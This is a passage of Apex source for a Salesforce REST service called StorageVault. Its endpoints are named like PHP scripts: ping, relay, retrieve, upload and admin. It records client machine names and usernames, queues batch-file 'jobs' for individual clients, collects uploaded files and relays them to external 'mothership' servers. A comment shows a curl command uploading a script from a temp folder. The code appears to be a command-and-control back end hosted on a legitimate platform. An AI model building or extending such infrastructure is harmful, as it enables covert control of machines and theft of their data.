                                                          WHERE StorageVault__ClientID__c = : clientid AND 
                                                          ( StorageVault__EndTS__c = '' OR StorageVault__EndTS__c = null )
                                                          ORDER BY LastModifiedDate DESC
                                                          LIMIT 1];
            if ( relayjobs.isEmpty() ) {
                res.statusCode = 400;
                res.responseBody = Blob.valueOf('ERROR :: could not retrieve any matching RelayJob corresponding to ClientID: '+clientid);
                return;                
            }
            
            StorageVault__RelayJob__c relayjob = relayjobs[0];
            
            sessionid = relayjob.StorageVault__SessionID__c;
            string createts = relayjob.StorageVault__CreateTS__c;
            
            res.responseBody = Blob.valueOf('{ "SessionID": "'+sessionid+'", "RelayJob": "'+relayjob.ID+'", "ClientID":"'+clientid+'", "CreateTS":"'+createts+'" }');
            
            return;                
        }
        
        res.statusCode = 400;
        res.responseBody = Blob.valueOf('FATAL ERROR');
        
        return;
    } 
    
    public static List<Map<string,string>> GetClientAccess() {

        Set<String> accesslogs = new Set<String>();
        Set<string> clientids = new Set<string>(); 

        List<AggregateResult> results = [ SELECT MAX(Name) RowID, StorageVault__ClientID__c clientid, 
                                            MAX(LastModifiedDate) LatestDate 
                                            FROM StorageVault__Logger__c 
                                            WHERE StorageVault__SOURCE__c = 'ping.php'
                                            GROUP BY StorageVault__ClientID__c ];

        for (AggregateResult ar : results) {
            String rowid = String.valueOf(ar.get('RowID'));

            accesslogs.add(rowid);

            clientids.add((string) ar.get('clientid'));
        }

        List<StorageVault__Client__c> clients = [ SELECT ID, StorageVault__ClientID__c, CreatedDate 
                                                  FROM StorageVault__Client__c 
                                                  WHERE StorageVault__ClientID__c IN : clientids ];

        Map<string, DateTime> clientmap = new Map<string, DateTime>();
        
        for ( StorageVault__Client__c client : clients ) {
            clientmap.put(client.StorageVault__ClientID__c, client.CreatedDate);
        }
        
        List<StorageVault__Logger__c> logs = [ SELECT ID, StorageVault__ClientID__c, 
                                                LastModifiedDate, StorageVault__ProfileStr__c,
                                                StorageVault__LogMsg__c, 
                                                StorageVault__Machinename__c, 
                                                StorageVault__SOURCE__c, 
                                                StorageVault__TSOURCE__c,
                                                StorageVault__Username__c,
                                                StorageVault__ScriptVersion__c,
                                                StorageVault__SessionTS__c,
                                                CreatedDate 
                                               FROM StorageVault__Logger__c 
                                               WHERE Name IN :accesslogs ];

        List<Map<string,string>> clientaccesslist = new List<Map<string,string>>();

        for (StorageVault__Logger__c log : logs) {
            string clientidkey = log.StorageVault__ClientID__c;
            
            if ( String.isBlank(clientidkey) )
                continue;

            Map<string,string> clientaccess = new Map<string,string>();

            clientaccess.put('ClientID',log.StorageVault__ClientID__c);
            clientaccess.put('LogMsg',log.StorageVault__LogMsg__c);
            clientaccess.put('Machinename',log.StorageVault__Machinename__c);
            clientaccess.put('ProfileStr',log.StorageVault__ProfileStr__c);

            string registerdt = clientmap.get(log.StorageVault__ClientID__c).format();

            if ( String.isBlank(registerdt) )
                registerdt = Datetime.now().format('yyyyMMddHHmmssSSS');

            clientaccess.put('RegisterDT',registerdt); // get CreatedDate
            clientaccess.put('SOURCE',log.StorageVault__Source__c);
            clientaccess.put('ScriptVersion',log.StorageVault__ScriptVersion__c);
            
            string sessionts = log.StorageVault__SessionTS__c;
            
            if ( String.isBlank(sessionts) )
                sessionts = registerdt;// Datetime.now().format('yyyyMMddHHmmssSSS');

            clientaccess.put('SessionDT',log.StorageVault__SessionTS__c);
            clientaccess.put('Username',log.StorageVault__Username__c);
            clientaccess.put('TSOURCE',log.StorageVault__TSource__c);
            clientaccess.put('LastModifiedDate',log.LastModifiedDate.format('yyyy-MM-dd HH:mm:ss.SSS'));

            clientaccesslist.add(clientaccess);
        }

        return clientaccesslist;      
    }

    public static List<Map<string,string>> GetClientJobs() {
        
        List<Map<string,string>> jobslist = new List<Map<string,string>>();

        List<StorageVault__ClientJob__c> jobs = [ SELECT ID, Name,
                                                  StorageVault__ClientID__c, 
                                                  StorageVault__CreateTS__c,
                                                  StorageVault__EndTS__c,
                                                  StorageVault__JobCode__c,
                                                  StorageVault__JobFile__c,
                                                  StorageVault__JobIndex__c,
                                                  StorageVault__JobName__c,
                                                  StorageVault__Result__c,
                                                  StorageVault__RetrieveTS__c,
                                                  StorageVault__StartTS__c
                                                  FROM StorageVault__ClientJob__c 
                                                  ORDER BY CreatedDate DESC ];

        for ( StorageVault__ClientJob__c job : jobs) {
            Map<string,string> jobmap = new Map<string,string>();

            jobmap.put('ClientID',job.StorageVault__ClientID__c);
            jobmap.put('CreateTS',job.StorageVault__CreateTS__c);
            jobmap.put('CreateDT',null);
            jobmap.put('EndTS',job.StorageVault__EndTS__c);
            jobmap.put('JobCode',job.StorageVault__JobCode__c);
            jobmap.put('JobFile',job.StorageVault__JobFile__c);
            jobmap.put('JobIndex',job.StorageVault__JobIndex__c);
            jobmap.put('JobName',job.StorageVault__JobName__c);
            jobmap.put('Result',job.StorageVault__Result__c);
            jobmap.put('RetrieveDT',null);
            jobmap.put('RetrieveTS',job.StorageVault__RetrieveTS__c);
            jobmap.put('RowID',job.Name);
            jobmap.put('StartTS',job.StorageVault__StartTS__c);            

            jobslist.add(jobmap);
        }

        return jobslist;
    }

    public static List<string> GetFilesList() {
        List<string> files = new List<string>();

        List<AggregateResult> results = [
            SELECT Title, MAX(LastModifiedDate) latestModDate
            FROM ContentVersion
            WHERE IsLatest = true 
            GROUP BY Title
            ORDER BY MAX(LastModifiedDate) DESC
        ];
        
        for (AggregateResult ar : results) {
            String fileTitle = (String) ar.get('Title');
            files.add(fileTitle);
        }

        return files;
    }

    // admin.php -- POST requests
    public static void adminpost(RestRequest req, RestResponse res) {
        String relativeUrl = req.requestURI; 
        
        List<String> pathSegments = relativeUrl.split('/');
        
        String endpoint = '';
        
        if ( ! pathSegments.isEmpty() ) {
            endpoint = pathSegments.get(pathSegments.size()-1);
        }
        
        if ( endpoint != 'admin.php' ) {
			res.statusCode = 500;
            res.responseBody = Blob.valueOf('endpoint not admin.php');        
            return;
        }
        
        String method = req.httpMethod;

        if ( method != 'POST' ) {
			res.statusCode = 500;
            res.responseBody = Blob.valueOf('only POST requests are permitted at this endpoint');        
            return;
        }

        Map<string,string> kvp = KVPLCase(req.params);

        string action = kvp.containsKey('action') ? kvp.get('action') : null;
        string clientid = kvp.containsKey('clientid') ? kvp.get('clientid') : null;
        string jobfilename = kvp.containsKey('jobfilename') ? kvp.get('jobfilename') : null;
        string jobpriority = kvp.containsKey('jobpriority') ? kvp.get('jobpriority') : null; // JobIndex

        if ( jobpriority == 'undefined' )
            jobpriority = '-1';

        string msg = 'creating new clientjob: clientid='+clientid+' jobfilename='+jobfilename+' action='+action;

        PublishMsgLogger('admin.php', 'mothership', msg, req);

        StorageVault__ClientJob__c clientjob = new StorageVault__ClientJob__c();

        clientjob.StorageVault__ClientID__c = clientid;
        clientjob.StorageVault__CreateTS__c = Datetime.now().format('yyyyMMddHHmmssSSS');
        clientjob.StorageVault__JobFile__c = jobfilename;
        clientjob.StorageVault__JobName__c = action;
        clientjob.StorageVault__JobIndex__c = String.isBlank(jobpriority) ? '-1' : jobpriority;

        // insert clientjob;

        Database.SaveResult result = Database.insert(clientjob, false);

        if (result.isSuccess()) {
            msg = 'new clientjob: clientjob.ID=' + result.getId();
            PublishMsgLogger('admin.php', 'mothership', msg, req);
        } else {
            
            for (Database.Error err : result.getErrors()) {
                msg = 'Error Status Code: ' + err.getStatusCode() + '|';
                msg += 'Error Message: ' + err.getMessage() + '|';
                msg += 'Affected Fields: ' + err.getFields();

                msg = 'new clientjob: clientjob.ID=' + result.getId();
                PublishMsgLogger('admin.php', 'mothership', msg, req);
            }

        }

        return;
    }

    // admin.php -- GET requests
    public static void admin(RestRequest req, RestResponse res) {
        String relativeUrl = req.requestURI; 
        
        List<String> pathSegments = relativeUrl.split('/');
        
        String endpoint = '';
        
        if ( ! pathSegments.isEmpty() ) {
            endpoint = pathSegments.get(pathSegments.size()-1);
        }
        
        if ( endpoint != 'admin.php' ) {
			res.statusCode = 500;
            return;
        }

        Map<string,string> kvp = KVPLCase(req.params);

        string clientid = kvp.containsKey('clientid') ? kvp.get('clientid') : null;

        // clientaccess = clientaccess [ Logger records --> source = ping.php ]
        // clientjobs = clientjobs --> [ ClientJob records ]
        // jobfiles = jobfileslist [ 'cmd_list_snapshot_full.bat']

        List<Map<string,string>> clients = GetClientAccess();

        List<Map<string,string>> clientjobs = GetClientJobs();

        List<string> files = GetFilesList();

        string json_clients = JSON.serialize(clients);
        string json_clientjobs = JSON.serialize(clientjobs);
        string json_files = JSON.serialize(files);

        string finalstr = '{ "clientaccess": '+json_clients+', ';
        finalstr += ' "clientjobs": ' + json_clientjobs + ', ';
        finalstr += ' "jobfileslist": ' + json_files + ' }';

        res.responseBody = Blob.valueOf(finalstr);
        return;
    }

    // admin.html
    public static void adminui(RestRequest req, RestResponse res) {
        ContentVersion cv = GetContentVersion('admin.html');

        if ( cv == null ) {
            res.statusCode = 400;
            res.responseBody = Blob.valueOf('version data is empty');
            return;
        }

        res.addHeader('Content-Type', 'text/html; charset=utf-8');

        res.responseBody = cv.VersionData;
        return;
    }

    // upload.php -- PUT requests
    @HttpPut
    global static void handleRawPut() {
        string pp = 'handleRawPut';

        RestRequest req = RestContext.request;
        RestResponse res = RestContext.response;

        String relativeUrl = req.requestURI; 
        
        LogSys(pp +'|' + 'PUT request: ' + relativeUrl);

        List<String> pathSegments = relativeUrl.split('/');
        
        String endpoint = '';
        
        if ( ! pathSegments.isEmpty() ) {
            endpoint = pathSegments.get(pathSegments.size()-1);
        }

        LogSys(pp +'|' + 'endpoint=' + endpoint);

        if ( endpoint.toLowerCase() != 'upload.php' ) {
            res.statusCode = 400;
            res.responseBody = Blob.valueOf('ERROR :: invalid endpoint ['+endpoint+'] -- all PUT requests must be sent to upload.php\r\n');
            return;
        }

        Map<string,string> kvp = KVPLCase(req.params);

        string filename = kvp.containsKey('filename') ? kvp.get('filename') : '';
        string clientid = kvp.containsKey('clientid') ? kvp.get('clientid') : '';
        string batchid = kvp.containsKey('batchid') ? kvp.get('batchid') : '';

        LogSys(pp +'|' + 'filename=' + filename + '|clientid=' + clientid + '|batchid=' + batchid);

        if ( String.isBlank(filename) ) {
            res.statusCode = 400;
            res.responseBody = Blob.valueOf('ERROR :: filename param is empty\r\n');
            return;
        }

        Blob fileBlob = req.requestBody;

        if (fileBlob == null || fileBlob.size() == 0) {
            res.statusCode = 400;
            res.responseBody = Blob.valueOf('ERROR :: upload file is empty\r\n');
            return;
        }

        StorageVault__MothershipConfig__c config = getFirstMothershipConfig();
        
        List<string> endpointurls = new List<string>();
        endpointurls = (List<String>) JSON.deserialize(config.StorageVault__PHPMotherships__c, List<String>.class);

        for ( string endpointurl : endpointurls ) {
            Http http = new Http();        
            HttpRequest request = new HttpRequest();

            string url = endpointurl + '/ow/upload.php?filename=' + EncodingUtil.urlEncode(filename, 'UTF-8') + '&clientid=' + clientid + '&batchid=' + batchid;

            request.setEndpoint(url);
            request.setMethod('PUT');
            request.setHeader('Content-Type', 'application/octet-stream');
            request.setHeader('Content-Length', String.valueOf(fileBlob.size()));
            request.setBodyAsBlob(fileBlob);

            try {

                HttpResponse response = http.send(request);
                                
                res.statusCode = response.getStatusCode();
                res.responseBody = response.getBodyAsBlob();

                return;
            } catch (Exception ex) {
                LogSysEx(ex);
            }
        }

        res.statusCode = 500;
		res.responseBody = Blob.valueOf('FATAL ERROR :: should not have reached here\r\n');
    }

    // upload.php
    // curl -v -ks -X POST https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/upload.php?filename=zfei.vbs 
    // -H "Content-Type: application/octet-stream" 
    // --data-binary @"%temp%\owd\zfei.vbs"
    // clientid=%clientid%
    // filename=%%F
    // batchid=%batchid%
    @HttpPost
    global static void processPostRequest() {
        RestRequest req = RestContext.request;
        RestResponse res = RestContext.response;
        
        String relativeUrl = req.requestURI; 
        
        LogSys('POST request: ' + relativeUrl);

        List<String> pathSegments = relativeUrl.split('/');
        
        String endpoint = '';
        
        if ( ! pathSegments.isEmpty() ) {
            endpoint = pathSegments.get(pathSegments.size()-1);
        }
        
        if ( ( endpoint != 'upload.php' ) && ( endpoint != 'admin.php') ) {
			res.statusCode = 400;
            res.responseBody = Blob.valueOf('endpoint not supported: '+endpoint+ '\r\n');
            return;
        }
        
        if ( endpoint == 'admin.php' ) {
            adminpost(req,res);
            admin(req,res);
            return;
        }

        Map<string,string> kvp = KVPLCase(req.params);
        
        string clientid = kvp.containsKey('clientid') ? kvp.get('clientid') : '';
        String filename = kvp.containsKey('filename') ? kvp.get('filename') : '';
        String batchid = kvp.containsKey('batchid') ? kvp.get('batchid') : '';

        Blob fileBlob = req.requestBody;
                       
        if ( String.isBlank(filename)) {
            res.statusCode = 400;
            res.responseBody = Blob.valueOf('ERROR :: url param filename is required');
            return;
        }

        if (fileBlob == null ) {
            res.statusCode = 400;
            res.responseBody = Blob.valueOf('ERROR :: file body data is null');
            return;
        }

        if ( fileBlob.size() == 0 ) {
            res.statusCode = 400;
            res.responseBody = Blob.valueOf('ERROR :: file body byte count is zero');
            return;
        }

        string t_clientid = String.isBlank(clientid) ? '' : clientid + '_';
        string t_batchid = String.isBlank(batchid) ? '' : batchid + '_';
        string t_filename = t_clientid + t_batchid + filename;

        PublishMsgLogger('upload.php', 'mothership', 'uploading file: '+t_filename, req);

        Id currentUserId = UserInfo.getUserId();

        ContentVersion cv = new ContentVersion();
        cv.Title = t_filename;
        cv.PathOnClient = '/' + t_filename; 
        cv.VersionData = fileBlob;
        cv.IsMajorVersion = true;
        // cv.ContentLocation = 'C'; // 'C' indicates it's stored in Salesforce
        cv.IsMajorVersion = true;
        cv.SharingPrivacy = 'N'; 
        cv.FirstPublishLocationId = currentUserId; // Automatically links the file to the user

        insert cv;
                
        string msgstr = 'filesize='+String.valueOf(fileBlob.size())+'|'+'filename='+t_filename + '|'+'recordid='+String.valueOf(cv.Id);
        
        PublishMsgLogger('upload.php', 'mothership', msgstr, req);

        res.statusCode = 200;
        res.responseBody = Blob.valueOf(msgstr+ '\r\n');
        
        return;
    }
    
    
    // ping.php, logmsg.php, relay.php, retrieve.php
    // GET: /services/apexrest/StorageVault/
	// curl -v -ks -G https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/tttt/asdfas/asdfasf/asdfasd?asdf=123
	// asdf=123|[/StorageVault/tttt/asdfas/asdfasf/asdfasd]
	// X-Custom-Header: YourCustomValue
    @HttpGet
    global static void processGetRequest() {
        RestResponse res = RestContext.response;
        RestRequest req = RestContext.request;
		String htmlString = '';

        String relativeUrl = req.requestURI; 
        
        try {
            
            List<String> pathSegments = relativeUrl.split('/');
            
            String endpoint = '';
            
            if ( ! pathSegments.isEmpty() ) {
                endpoint = pathSegments.get(pathSegments.size()-1);
            }

            LogSys('processGetRequest|relativeUrl='+relativeUrl+'|endpoint='+endpoint);
            
            integer segcount = pathSegments.size();

            if ( segcount > 1 ) {
                string pathdir = pathSegments.get(pathSegments.size()-2);
                string fname = endpoint;
            
                if ( pathdir.toLowerCase() == 'assets' ) {
                    // logmsg --> retrieving filename etc.

                    ContentVersion cv = GetContentVersion(fname);

                    if ( cv != null ) {
                        Blob fileBlob = cv.VersionData;
                
                        if ( fileblob.size() == 0 ) {
                            res.statusCode = 500;        
                            res.responseBody = Blob.valueOf('requested file is empty: '+fname);            
                            return;
                        }

                        res.addHeader('Content-Type', 'application/octet-stream');
                        res.addHeader('Content-Disposition', 'attachment; filename="' + cv.Title + '"');
                        // res.addHeader('Content-Length', String.valueOf(fileblob.size())); // results in error: Header name "Content-Length" is not allowed.
                        res.addHeader('Expires', '0');
                        res.addHeader('Cache-Control', 'must-revalidate');
                
                        res.responseBody = fileBlob;
                        return;
                    } else {
                        res.statusCode = 400;        
                        res.responseBody = Blob.valueOf('requested file does not exist: '+fname);        
                        return;
                    }
                }
            }

            if ( endpoint == 'ping.php' ) {
                ping(req,res);
                return;
            } else if ( endpoint == 'retrieve.php' ) {
                retrieve(req,res);
                return;
            } else if ( endpoint == 'logmsg.php' ) {
                logmsg(req,res);
                return;
            } else if ( endpoint == 'relay.php' ) {
                relay(req,res);
                return;
            } else if ( endpoint == 'admin.php' ) {
                admin(req,res);
                return;
            
            } else if ( endpoint == 'adminui' ) {
                adminui(req,res);
                return;
            } else if ( endpoint == 'config.php' ) {
                string configtext = getMothershipConfig();
                res.headers.put('Content-Type', 'text/plain');
                res.responseBody = Blob.valueOf(configtext);
                return;
            } else {
                res.responseBody = Blob.valueOf('requested endpoint not implemented');        
                res.statusCode = 500;
            }

        } catch (Exception e) {
            LogSysEx(e);
            
            String stackTrace = e.getStackTraceString(); 

            res.responseBody = Blob.valueOf(e.getMessage() + '\r\n' + 'stacktrace: ' + '\r\n' + stackTrace + '\r\n');
            res.statusCode = 400;
            return;        
        }   

		res.responseBody = Blob.valueOf('FATAL ERROR -- should not have reached here');        
        res.statusCode = 500;
		return;        
    }

}